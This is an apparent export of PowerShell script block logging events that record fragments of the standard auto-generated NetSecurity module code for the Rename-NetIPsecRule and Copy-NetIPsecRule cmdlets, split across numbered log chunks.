    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewPolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewGPOSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName=

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (13 of 23):
tization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('OutboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${OutboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('OutboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${QuickModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('QuickModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase2AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase2AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase2AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('KeyModule') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${KeyModule})
        $__cmdletization_queryBuilder.FilterByProperty('KeyModule', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowWatchKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowWatchKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowWatchKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowSetKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowSetKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowSetKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteTunnelHostname})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteTunnelEndpointDNSName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForwardPathLifetime') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForwardPathLifetime})
        $__cmdletization_queryBuilder.FilterByProperty('MaxReturnPathLifetimeSeconds', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EncryptedTunnelBypass})
        $__cmdletization_queryBuilder.FilterByProperty('BypassTunnelIfEncrypted', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RequireAuthorization') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RequireAuthorization})
        $__cmdletization_queryBuilder.FilterByProperty('RequireAuthorization', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('User') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${User})
        $__cmdletization_queryBuilder.FilterByProperty('Users', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Machine') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Machine})
        $__cmdletization_queryBuilder.FilterByProperty('Machines', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetConSecRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetConSecRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetConSecRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetConSecRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetConSecRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase2AuthSet') -and (@('ByAssociatedNetIPsecPhase2AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase2AuthSet}, 'MSFT_NetConSecRuleEMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetConSecRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeCryptoSet') -and (@('ByAssociatedNetIPsecQuickModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeCryptoSet}, 'MSFT_NetConSecRuleQMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetIPsecRule' -Alias '*'
        

function Copy-NetIPsecRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]

    param(
    
    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Paramete

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (12 of 23):
reSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase2AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByQuery', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet', Mandatory=$true)]
    [Parameter(ParameterSetName='GetAll', Mandatory=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true)]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
